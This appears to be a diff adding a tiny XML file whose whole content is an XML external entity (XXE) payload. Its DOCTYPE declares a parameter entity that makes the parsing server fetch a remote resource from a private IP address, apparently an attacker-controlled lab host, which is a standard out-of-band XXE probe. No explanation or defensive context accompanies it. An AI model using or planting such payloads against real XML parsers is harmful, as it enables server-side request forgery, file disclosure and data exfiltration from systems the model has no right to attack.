@@ -1,0 +1,5 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://10.10.15.195/test">
+%xxe;
+]>
